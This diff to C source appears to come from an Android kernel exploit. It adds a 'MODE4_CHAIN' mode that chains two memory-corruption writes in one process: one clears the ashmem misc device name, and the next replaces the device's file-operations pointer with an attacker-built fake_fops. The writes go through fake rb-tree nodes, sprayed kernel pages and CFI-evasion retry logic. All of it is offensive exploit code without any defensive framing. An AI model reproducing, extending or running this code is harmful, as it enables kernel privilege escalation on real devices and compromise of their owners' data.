@@ -6,6 +6,11 @@ static double fops_elapsed_ms(struct timespec *ref) {
   clock_gettime(CLOCK_MONOTONIC, &now);
   return (now.tv_sec - ref->tv_sec) * 1000.0 + (now.tv_nsec - ref->tv_nsec) / 1e6;
 }
+/*
+ * MODE4_CHAIN=1: attempt1 ZERO_NAME (*name=0), attempt2 ION_SAFE (*MISC=fake_fops)
+ * same process so wait_lock zero persists without second full softboot cycle.
+ */
+static int g_mode4_chain_phase; /* 0=off 1=zero_name 2=ion_safe */
 extern int pselect_custom_write;
 
 #define PSELECT_CFI_ROUTE_ATTEMPTS 8
@@ -140,6 +145,7 @@ void open_selected_fds(
                    env_flag("MODE4_CLASSIC_LEAF", 0) ||
                    env_flag("MODE4_CLASSIC_NOP", 0) ||
                    env_flag("MODE4_ZERO_NAME", 0) ||
+                   env_flag("MODE4_CHAIN", 0) ||
                    env_flag("MODE4_ION_ROOT", 0) ||
                    env_flag("MODE4_ION_SAFE", 0) ||
                    env_flag("MODE4_ION_FOPS", 0) ||
@@ -363,14 +369,10 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
         uint64_t stack_prio = 1;
         uint64_t stack_deadline = 0;
         uint64_t stack_lock = fake_lock;
-        if (env_flag("MODE4_ZERO_NAME", 0)) {
+        if (env_flag("MODE4_ZERO_NAME", 0) || g_mode4_chain_phase == 1) {
           /*
-           * Option-2 step A: do NOT use parent=MISC-8 (fops-8).
-           * parent = ashmem_misc base = MISC-16; leaf only-right writes
-           * parent->rb_right @ +8 = name slot → *name=0.
-           * If wait_lock at MISC-8 is name, zeroing unlocks ION_ROOT next.
-           * PROOF1: death was in setprio with MISC-8 parent; this parent is
-           * miscdevice+0 (minor), different geometry.
+           * Option-2 step A / CHAIN phase1: parent=MISC-16 leaf → *name=0.
+           * Unlocks wait_lock at MISC-8 for ION (CHAIN phase2).
            */
           tree_pc = (misc - 16) & ~3ULL;
           tree_r = 0;
@@ -382,9 +384,8 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
           stack_prio = 200;
           stack_deadline = 0x1000;
           pr_info("stack mode4 ZERO_NAME parent=MISC-16=%016llx right=0 "
-                  "left=0 prio=200 (leaf → *ashmem_misc.name=0; unlock "
-                  "ION wait_lock; NOT fops write yet)\n",
-                  (unsigned long long)tree_pc);
+                  "left=0 prio=200 (leaf → *name=0; chain_phase=%d)\n",
+                  (unsigned long long)tree_pc, g_mode4_chain_phase);
         } else if (env_flag("MODE4_ROOT_SPRAY", 0)) {
           /*
            * Root erase into fake_lock.waiters. right must be valid rb leaf
@@ -401,12 +402,12 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
           stack_deadline = 0x1000;
           pr_info("stack mode4 ROOT_SPRAY parent=1 right=fake_fops "
                   "lock=fake (root erase → *lock.waiters)\n");
-        } else if (env_flag("MODE4_ION_ROOT", 0) || env_flag("MODE4_ION_SAFE", 0)) {
+        } else if (env_flag("MODE4_ION_ROOT", 0) || env_flag("MODE4_ION_SAFE", 0) ||
+                   g_mode4_chain_phase == 2) {
           /*
            * Ion root: lock=MISC-8, parent=1, right=fake_fops → *MISC=fake_fops.
-           * Needs *(u32*)(MISC-8)==0 (name cleared via ZERO_NAME first).
-           * MODE4_ION_SAFE: fake_fops[0:0x18] rb leaf so re-enqueue can walk
-           * waiters root (=fake_fops after write) without following JTs.
+           * Needs *(u32*)(MISC-8)==0 (ZERO_NAME / CHAIN phase1 first).
+           * CHAIN/ION_SAFE: fake_fops[0:0x18] is rb leaf for re-enqueue.
            */
           tree_pc = 1;
           tree_r = fake_fops;
@@ -418,9 +419,11 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
           stack_prio = 90;
           stack_deadline = 0x1000;
           pr_info("stack mode4 %s lock=MISC-8=%016llx parent=1 right=fake_fops "
-                  "(root → *MISC; need name/wait_lock=0; ION_SAFE=rb leaf fops)\n",
-                  env_flag("MODE4_ION_SAFE", 0) ? "ION_SAFE" : "ION_ROOT",
-                  (unsigned long long)stack_lock);
+                  "(root → *MISC; wait_lock=0; chain_phase=%d)\n",
+                  (g_mode4_chain_phase == 2 || env_flag("MODE4_ION_SAFE", 0))
+                      ? "ION_SAFE"
+                      : "ION_ROOT",
+                  (unsigned long long)stack_lock, g_mode4_chain_phase);
         } else if (env_flag("MODE4_ION_FOPS", 0) || env_flag("MODE4_EXP_N", 0)) {
           uint64_t fops_off =
               (active_offsets && active_offsets->off_ashmem_fops)
@@ -722,17 +725,31 @@ void do_pselect_fake_lock_route(void) {
   int calls = 0;
   int success = 0;
   int route_verified = 0;
-  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
-       route_attempt++) {
+  int chain = env_flag("MODE4_CHAIN", 0);
+  int max_att = chain ? 2 : PSELECT_CFI_ROUTE_ATTEMPTS;
+  if (chain)
+    pr_info("MODE4_CHAIN=1: phase1 ZERO_NAME then phase2 ION_SAFE (same process)\n");
+  for (int route_attempt = 1; route_attempt <= max_att; route_attempt++) {
+    if (chain)
+      g_mode4_chain_phase = (route_attempt <= 1) ? 1 : 2;
+    else
+      g_mode4_chain_phase = 0;
     if (route_attempt != 1) {
-      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
-      if (!page_base || !fake_lock || !fake_fops) {
-        cfi_last_step = 34;
-        cfi_last_errno = errno;
-        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
-                 "lock=%016zx fops=%016zx\n",
-                 route_attempt, page_base, fake_lock, fake_fops);
-        break;
+      /* CHAIN phase2: reuse spray so fake_fops stays; name zero is in kernel. */
+      int reuse_page = chain && route_attempt == 2 && page_base && fake_fops;
+      if (!reuse_page) {
+        page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+        if (!page_base || !fake_lock || !fake_fops) {
+          cfi_last_step = 34;
+          cfi_last_errno = errno;
+          pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
+                   "lock=%016zx fops=%016zx\n",
+                   route_attempt, page_base, fake_lock, fake_fops);
+          break;
+        }
+      } else {
+        pr_info("MODE4_CHAIN reuse FOPS page for ION after ZERO_NAME\n");
+        durable_proof_log("chain_reuse_page_ion");
       }
     }
 
@@ -922,6 +939,12 @@ void do_pselect_fake_lock_route(void) {
     close(pipefd[0]);
     close(pipefd[1]);
 
+    if (chain && route_attempt == 1 && success > 0) {
+      durable_proof_log("chain_zero_done_next_ion");
+      pr_info("MODE4_CHAIN phase1 done success=%d cfi_step=%d → ION_SAFE\n",
+              success, cfi_last_step);
+      continue; /* force phase2 even if cfi22 */
+    }
     if (route_quality_miss) {
       continue;
     }
@@ -929,7 +952,7 @@ void do_pselect_fake_lock_route(void) {
       break;
     }
     pr_info("pselect cfi write miss attempt=%d/%d errno=%d; refreshing FOPS page\n",
-            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_errno);
+            route_attempt, max_att, cfi_last_errno);
   }
   pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
           calls, success, cfi_last_step, cfi_last_errno);
